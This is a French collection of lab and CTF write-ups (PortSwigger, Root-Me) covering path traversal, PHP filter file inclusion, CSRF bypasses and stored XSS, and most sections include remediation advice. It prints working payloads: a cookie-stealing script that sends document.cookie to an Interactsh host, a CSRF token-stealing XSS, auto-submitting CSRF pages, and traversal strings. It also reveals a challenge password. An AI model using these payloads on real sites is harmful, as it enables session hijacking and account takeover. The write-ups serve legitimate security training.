# Challenge 1 – File Path Traversal, Validation of File Extension with Null Byte Bypass

---

## 🔗 Nom / URL du challenge
**Nom :** Port Swigger Lab: File path traversal, validation of file extension with null byte bypass  
**URL :** https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

---

## 🔍 Étapes de découverte de la vulnérabilité

1. J’ai activé **Intercept On** dans Burp Suite pour observer les requêtes envoyées lors de la navigation.
2. En consultant la fiche d’un produit, Burp Suite a intercepté une requête contenant un paramètre `filename` utilisé pour charger l’image du produit.
3. J’ai identifié ce paramètre comme potentiellement vulnérable à un path traversal.
4. J’ai modifié la valeur du paramètre dans Burp afin de tester un accès à un fichier sensible présent sur le serveur.
5. L’application validait uniquement la fin de la chaîne (doit se terminer par `.png`), mais ne gérait pas correctement le caractère **null byte**, permettant de contourner cette validation.
6. La réponse du serveur a confirmé l’accès au fichier ciblé, prouvant l’exploitation de la vulnérabilité.

---

## 📸 Payload utilisé + Screenshot

../../../etc/passwd%00.png

### **Screenshot de la requête modifiée dans Burp Suite :**
![img.png](img-challenges-1-4/img_1.png)

### **Screenshot de la réponse confirmant l’exploitation :**
![img.png](img-challenges-1-4/img_2.png)

---

## 🛡️ Recommandations pour sécuriser cette vulnérabilité

### ✔️ 1. Éviter d'utiliser l’input utilisateur dans les API de fichiers
La méthode la plus sûre consiste à **ne jamais passer des données utilisateur directement aux fonctions du système de fichiers**.

> "The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether."

---

### ✔️ 2. Valider l’input utilisateur
Si l’utilisation d’un input utilisateur est inévitable :

#### a. Utiliser une liste blanche
Comparer l’input avec une **liste de valeurs autorisées**.

#### b. Sinon, valider strictement le contenu
S'assurer que la valeur ne contient **que des caractères autorisés** (alphanumériques par exemple).  
Éviter tout caractère dangereux : `..`, `/`, `\`, `%00`, etc.

---

### ✔️ 3. Canonicaliser le chemin final
Une fois l’input validé :

1. Concaténer l’input avec un répertoire de base contrôlé.
2. Utiliser une API système pour **canonicaliser** le chemin.
3. Vérifier que le chemin canonicalisé commence par le répertoire autorisé.

#### Exemple officiel (Java) :

```java
File file = new File(BASE_DIRECTORY, userInput);

if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}
```
---

## 📚 Référence utilisée

Portswigger : How to prevent a path traversal attack  
https://portswigger.net/web-security/file-path-traversal#how-to-prevent-a-path-traversal-attack
---

# Challenge 2 – PHP - Filters

---

## 🔗 Nom / URL du challenge
**Nom :** Root me: PHP - Filters  
**URL :** https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters

### 🔍 Étapes de découverte de la vulnérabilité

1. Dans la page de connexion, j’observe un paramètre `inc` dans l’URL qui inclut dynamiquement des fichiers (`?inc=login.php`).  
   ![img.png](img-challenges-1-4/img.png)
2. Je teste l’injection de `?inc=/etc/passwd`, mais cela ne fonctionne pas : la requête est filtrée.  
   ![img_7.png](img-challenges-1-4/img_7.png)
3. J’utilise alors les **PHP filters**, notamment le wrapper `php://filter`, qui permet de lire le code source en Base64.  
   ![img_3.png](img-challenges-1-4/img_3.png)
4. Maintenant que j’ai récupéré le code source encodé en Base64, je le décode pour pouvoir le lire.  
   ![img_4.png](img-challenges-1-4/img_4.png)
5. Dans le code, on aperçoit la ligne `include("config.php");`. Je reproduis donc la même étape pour récupérer le fichier `config.php`.  
   ![img_8.png](img-challenges-1-4/img_8.png)  
   ![img_5.png](img-challenges-1-4/img_5.png)
6. Je récupère les identifiants de l’administrateur et je peux alors me connecter.  
   ![img_6.png](img-challenges-1-4/img_6.png)

## 📸 Payload utilisé + Screenshot

php://filter/convert.base64-encode/resource=login.php
![img_3.png](img-challenges-1-4/img_3.png)
php://filter/convert.base64-encode/resource=config.php
![img_8.png](img-challenges-1-4/img_8.png)

## 🛡️ Recommandations pour sécuriser cette vulnérabilité

- Ne jamais inclure un fichier directement à partir d’un paramètre utilisateur sans validation stricte.

- Mettre en place une **liste blanche** des fichiers autorisés :

```php
$allowed = ['home.php', 'login.php', 'about.php'];
$page = $_GET['inc'] ?? 'home.php';

if (in_array($page, $allowed)) {
    include($page);
}
```

- Désactiver les wrappers dans `php.ini` :
```
allow_url_include = Off
```
*(Cette seule directive empêche complètement l’usage du wrapper `php://filter`.)*

- Ne pas se fier à des filtres simples (blocage de `../`, `/`, etc.) :  
  → Ces filtres sont facilement contournables via les wrappers PHP.

- Si l’inclusion dynamique est obligatoire, utiliser `realpath()` pour vérifier le chemin réel et confirmer qu’il reste dans le répertoire autorisé :


## 📚 Référence utilisée
TCM Security – Local File Inclusion: A Practical Guide (2023)  
https://tcm-sec.com/local-file-inclusion-a-practical-guide/
---

# Challenge 3 – CSRF-contournement-de-jeton

---

## 🔗 Nom / URL du challenge
**Nom :** Root me: CSRF-contournement-de-jeton  
**URL :** https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton
---
## 🔍 Étapes de découverte de la vulnérabilité

1. J'arrive sur la page d'accueil, où deux boutons sont disponibles : **Login** et **Register**.  
   Je me crée donc un compte.  
   ![img_9.png](img-challenges-1-4/img_9.png)

2. Ensuite, je me connecte avec le compte que je viens de créer. J'aperçois une page **Profile** (on voit que mon compte n'est pas activé).  
   ![img_10.png](img-challenges-1-4/img_10.png)

3. Je remarque un champ caché nommé `token`, il s'agit d'un **jeton CSRF**.  
   ![img_11.png](img-challenges-1-4/img_11.png)

4. À chaque actualisation de la page, le token change. Je n'aperçois aucun code côté client lié à la génération du token CSRF, donc j'en déduis qu'il est généré côté serveur.

5. Le but est donc d’essayer **de récupérer le jeton CSRF de l’administrateur** afin de pouvoir **activer mon propre compte**.

6. Je passe par une faille XSS pour injecter du JavaScript dans l’onglet **Contact** pour que lorsque que l'admin (robot-admin) va consulter le message, le script va s’exécuter dans **son** navigateur et avec **ses** droits.
![img_13.png](img-challenges-1-4/img_12.png)

7. J'attends un peu que le robot passe et c'est bon mon compte est activé :
![img_13.png](img-challenges-1-4/img_13.png)

## 📸 Payload utilisé + Screenshot

```html
<form name="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
    <input type="hidden" name="username" value="TestBotan" />
    <input type="hidden" name="status" value="on" /> 
    <input id="admin-token" type="hidden" name="token" value="" />
</form>

<script>
    var request = new XMLHttpRequest();
    request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
    request.send(null);
    var response = request.responseText;
    var groups = response.match("token\" value=\"(.*?)\"");
    var token = groups[1];
    document.getElementById("admin-token").value = token; 
    document.csrf.submit();
</script>
```
![img_12.png](img-challenges-1-4/img_12.png)

## 🛡️ Recommandations pour sécuriser cette vulnérabilité

### 🔒 Prévention CSRF

1. **Utiliser des tokens CSRF uniques, aléatoires et imprévisibles**
    - Générés côté serveur.
    - Régénérés régulièrement (par requête ou par formulaire).
    - Associés à la session.

2. **Valider les tokens côté serveur pour toutes les requêtes sensibles**
    - Toute requête sans token ou avec un token incorrect doit être rejetée.

3. **Inclure explicitement le token CSRF dans les formulaires**
    - Jamais dans les cookies (le navigateur les enverrait automatiquement).

4. **Utiliser des en-têtes personnalisés pour les requêtes AJAX**
    - Exemple : `X-Requested-With`, `X-CSRF-Token`.
    - Vérifiés côté serveur.

5. **Configurer les cookies en `SameSite=Strict` ou `Lax`**
    - Empêche les cookies d’être envoyés depuis des sites tiers.

6. **Ne jamais effectuer d’actions sensibles via GET**
    - Les requêtes GET doivent être idempotentes.

7. **Utiliser OWASP CSRFGuard (pour Java)**
    - Injection automatique de tokens.
    - Protection centralisée et vérification des requêtes.

---

### 🔐 Prévention XSS

Comme l’attaque repose *sur l’injection de JavaScript dans le formulaire de contact*, il est essentiel de corriger la faille XSS.

1. **Échapper systématiquement les données en sortie**
    - `HTML escaping` pour le contenu HTML.
    - `Attribute escaping` pour les attributs (`value=""`, etc.).
    - `JavaScript escaping` pour les scripts intégrés.

2. **Utiliser une validation stricte des entrées**
    - Filtrer les caractères dangereux.
    - Refuser/assainir les données qui ne correspondent pas au format attendu.

3. **Désactiver l’interprétation du HTML dans les champs utilisateurs**
    - Afficher le contenu comme texte (ex. via `textContent` – côté client, ou équivalent serveur).

4. **Mettre en place une politique de sécurité de contenu (CSP)**
    - Interdire l’exécution de scripts inline.
    - Autoriser uniquement les scripts provenant de sources approuvées.

5. **Ne jamais faire confiance au contenu envoyé via les formulaires**
    - Toujours traiter comme contenu non fiable (principle of zero trust).

6. **Éviter les attributs dangereux**
    - Pas d’injection dans `onclick`, `src`, `href`, etc.
    - Pas de `innerHTML` pour afficher du contenu dynamique.

---

## 📚 Références utilisées

- **OWASP — Cross-Site Request Forgery Prevention Cheat Sheet**  
  https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

- **OWASP CSRFGuard**  
  https://owasp.org/www-project-csrfguard/

- **OWASP XSS Prevention Cheat Sheet**  
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
---

# Challenge 4 – Lab: CSRF where token is not tied to user session  

---

## 🔗 Nom / URL du challenge
**Nom :** Port Swigger Lab: CSRF where token is not tied to user session  
**URL :** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
---

## 🔍 Étapes de découverte de la vulnérabilité

Je me connecte au **premier compte utilisateur** fourni dans l’énoncé du lab.  
![img_14.png](img-challenges-1-4/img_14.png)

Une fois connecté, j’accède à la fonctionnalité permettant de modifier l’adresse e-mail et j’entre une adresse e-mail.  
J’active ensuite **Intercept On** dans Burp Suite afin d’observer les requêtes générées lors de cette action.

Je vois alors la requête envoyée pour changer l’adresse e-mail, dans laquelle apparaît le jeton CSRF. Pour éviter de modifier mon adresse e-mail, je **drop** la requête.

![img_15.png](img-challenges-1-4/img_15.png)

J’ouvre une fenêtre en **navigation privée** et me connecte au **second compte** fourni par le challenge, puis je fais exactement la même manipulation :
- naviguer vers le formulaire de changement d’e-mail
- entrer une nouvelle adresse
- intercepter la requête
- récupérer le jeton CSRF
- **drop** la requête

![img_16.png](img-challenges-1-4/img_16.png)  
![img_17.png](img-challenges-1-4/img_17.png)

De retour sur le premier compte, j’essaie maintenant de changer l’adresse e-mail en utilisant le jeton CSRF provenant du second compte afin de vérifier si le jeton est lié à la session de l’utilisateur.  
La requête est acceptée, donc j’en déduis que le jeton **n’est pas lié à la session utilisateur**.

![img_18.png](img-challenges-1-4/img_18.png)

Enfin, je retourne sur le second compte pour tenter une nouvelle modification d’adresse e-mail avec une adresse unique afin de générer un nouveau jeton CSRF.  
Je le récupère puis je **drop** la requête.

![img_19.png](img-challenges-1-4/img_19.png)

Je crée ensuite une page HTML malveillante (PoC) que la victime va charger et je l’héberge dans l’onglet « Exploit Server » du lab, en y mettant le jeton CSRF que je viens de récupérer.

Enfin, je l’envoie à la victime via le bouton **« Deliver exploit to victim »**.

Une fois l’exploit envoyé, la victime charge automatiquement la page malveillante. Le formulaire se soumet dans son navigateur en utilisant le jeton CSRF que j’ai récupéré, ce qui modifie son adresse e-mail sans aucune interaction de sa part.


![img_20.png](img-challenges-1-4/img_20.png)

## 📸 Payload utilisé + Screenshot
```html
<html>
<body>
    <form id="csrfForm" action="https://0a61007f04e8603480628ae1004a00ed.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="byilmaz1@myges.fr">
        <input type="hidden" name="csrf" value="BYYYnLe5xg8bqnpSvmOaP1pl0o2hFmNH">
    </form>

    <script>
        // AutoÃ¢ÂÂsubmit du formulaire dÃÂ¨s lÃ¢ÂÂouverture de la page
        document.getElementById("csrfForm").submit();
    </script>
</body>
</html>
```

![img_21.png](img-challenges-1-4/img_21.png)

# 🛡️ Recommandations pour sécuriser cette vulnérabilité

---

## ✔️ 1. Utiliser des tokens CSRF robustes

Le moyen le plus fiable de prévenir les attaques CSRF est d’inclure un **token CSRF** dans toutes les requêtes sensibles.  
Selon PortSwigger, ces tokens doivent :

- être **hautement imprévisibles** et contenir beaucoup d’entropie
- être **liés à la session utilisateur**
- être **strictement validés** côté serveur avant d’exécuter toute action

---

## ✔️ 2. Générer correctement les tokens CSRF

Pour garantir leur sécurité :

- générer les tokens via un **CSPRNG** (générateur aléatoire cryptographiquement sûr),
- utiliser comme graine :  
  → un timestamp + un secret statique,
- pour davantage d’assurance : concaténer l’output du CSPRNG avec une **valeur spécifique à l’utilisateur**, puis prendre un **hash cryptographique**.

Cela empêche un attaquant d’analyser des tokens existants pour prédire les prochains.

---

## ✔️ 3. Transmettre les tokens de manière sécurisée

PortSwigger recommande de :

- transmettre le token dans un **champ caché** d’un formulaire **HTML** envoyé en **POST** :

```html <input type=*hidden* name=*csrf-token* value=*CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz*> ```
- placer ce champ aussi tôt que possible dans le **HTML** :
- avant tout contenu contrôlable par l’utilisateur
- avant toute zone pouvant être manipulée par un attaquant

### ❌ Pratiques déconseillées

- Ne jamais placer le token dans un cookie.
- Éviter de placer le token dans l’**URL**, car celle‑ci :
    - peut être loguée
    - peut apparaître dans l’en‑tête **Referer**
    - peut être visible dans le navigateur


## ✔️ 4. Valider correctement les tokens CSRF

La validation doit être **systématique**, quel que soit :

- la méthode **HTTP** (**POST**, **GET**, **PUT**, etc.)
- le type de contenu envoyé

Lors d’une requête sensible, le serveur doit :

- comparer le token envoyé par le client avec celui **stocké dans la session**
- rejeter toute requête :
    - sans token
    - avec un token invalide
    - ou avec un token ne correspondant pas à la session utilisateur

➡️ **C’est précisément ce point que le lab met en évidence comme vulnérable.**

---

## ✔️ 5. Utiliser des cookies SameSite stricts

PortSwigger recommande de définir explicitement l’attribut **SameSite** pour chaque cookie émis.

Idéalement :

```text
SameSite=Strict
```
# Protection SameSite

- `SameSite=Strict` : protection maximale contre les requêtes intersites.
- Utiliser `Lax` uniquement si nécessaire.
- Éviter `SameSite=None` sauf cas maîtrisés.

Même si ce mécanisme ne remplace pas les tokens **CSRF**, il constitue une couche de protection supplémentaire.

## ✔️ 6. Se méfier des attaques cross-origin same-site

Les protections `SameSite` n’empêchent pas les attaques provenant d’un autre sous-domaine du même site.

PortSwigger recommande donc :

- D’isoler les fichiers utilisateurs ou le contenu non fiable sur un domaine distinct.
- D’auditer toutes les surfaces d’attaque des sous-domaines partageant la même racine.

## 📚 Références utilisées

- **PortSwigger – Preventing **CSRF** vulnerabilities**  
  [https://portswigger.net/web-security/csrf/preventing](https://portswigger.net/web-security/csrf/preventing)
  # Challenge 9–  XSS - Stockée 2
  ## Analyse initiale du site
  En arrivant sur le forum, j’ai d’abord testé le fonctionnement normal en soumettant un message simple :
   -Titre : test
   -Message : test
  ## Observation de la requête avec Burp
  En envoyant un message, j’intercepte via Burp une requête :
  ```
  POST /web-client/ch19/ HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  Cookie: status=invite
  ```
  
Je remarque un élément intéressant :
👉 Le cookie status semble indiquer si l’utilisateur est invite ou admin.
👉 Il est potentiellement réinjecté dans la page sans filtrage, ce qui suggère une possible vulnérabilité XSS

  ## Hypothèse : XSS via la valeur du cookie

Si la valeur du cookie status est affichée directement dans le HTML, alors en modifiant cette valeur pour y insérer du JavaScript, le script pourra être exécuté dans le navigateur…
Et surtout, dans le navigateur de l’administrateur, lorsqu’il affichera la page.

C’est une XSS stockée via cookie injection.
 ## Construction du payload XSS
J’utilise Interactsh pour récupérer les cookies volés (serveur d’exfiltration).
https://app.interactsh.com/#/
Je mets mon identifiant Interactsh dans un payload JavaScript :
 ```
<script>
document.location.href="https://MON_ID_INTERACTSH.oast.fun/?c="+document.cookie
</script>
 ```
Ensuite, j’injecte ce payload dans la valeur du cookie status dans Burp Repeater :
 ```
Cookie: status=aaaa"><script>document.location.href="https://MON_ID_INTERACTSH.oast.fun/?c="+document.cookie</script>;
 
 ```
Puis j’envoie la requête modifiée.
## Déclenchement de l’attaque

Quand l’administrateur visite la page du forum :
-le site réinjecte status dans le HTML,
-mon JavaScript est exécuté dans son navigateur,
-son cookie de session est envoyé sur mon serveur Interactsh.

Dans Interactsh, je vois une requête contenant :
```
?c=PHPSESSID=XXXXXXXXXXXX
```

🎉 Je possède maintenant le cookie admin.
## Usurpation de la session administrateur

Dans mon navigateur :

-Je vais dans Storage / Cookies.
-Je remplace ma valeur PHPSESSID par celle volée.
-Je recharge la page.

Je suis maintenant authentifiée comme admin.
## Accès à la section d’administration

En me rendant sur ?section=admin, le site m’affiche :
```
Vous pouvez valider ce challenge avec ce mot de passe :
E5HKEGyCXQVsYaehaqeJs0AfV
```

👉 C’est la solution du challenge.
# Challenge 4:CSRF where Referer validation depends on header being present
## Analyse du fonctionnement normal
Après connexion avec :
```
username: wiener  
password: peter
```
je teste  le changement d’email (image)
Burp Suite intercepte la requête :
(image)
## Test du filtre CSRF via Burp Repeater
test:supprimer complètement le header Referer
Je supprime la ligne :Referer: ...
Résultat : Requête acceptée
➡️ Le serveur n’oblige PAS la présence du Referer.
➡️ C’est la faille : un Referer absent permet de bypass le contrôle CSRF.
3. Contournement : suppression automatique du Referer

Le navigateur envoie automatiquement un header Referer lors des requêtes POST cross-origin.

Pour le supprimer, on utilise :
```
<meta name="referrer" content="no-referrer">
```

Cette balise force le navigateur à NE PAS envoyer de Referer, ce qui permet de contourner la protection CSRF.
4. Construction du payload CSRF

Sur l’exploit server du lab, j’héberge la page suivante :
```
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <h1>CSRF exploit</h1>
  <form action="https://0a91008f049689fe827f066f008d0000.web-security-academy.net/my-account/change-email" method="POST" id="csrfForm">
    <input type="hidden" name="email" value="owned@evil.com">
  </form>

  <script>
    document.getElementById("csrfForm").submit();
  </script>
</body>
</html>
```
🔍 Pourquoi ça marche ?

Le formulaire envoie une requête POST automatiquement.

Grâce à la balise <meta name="referrer" content="no-referrer">,
le navigateur supprime totalement le header Referer.

Le serveur accepte la requête sans Referer.

L’email de la victime est changé en : owned@evil.com.
## Validation du challenge

Depuis l’exploit server :

Je clique sur Store pour sauvegarder l’exploit.

Puis sur Deliver to victim.

Le serveur victime charge mon exploit → requête POST sans Referer → email modifié.

🎉 Challenge résolu.

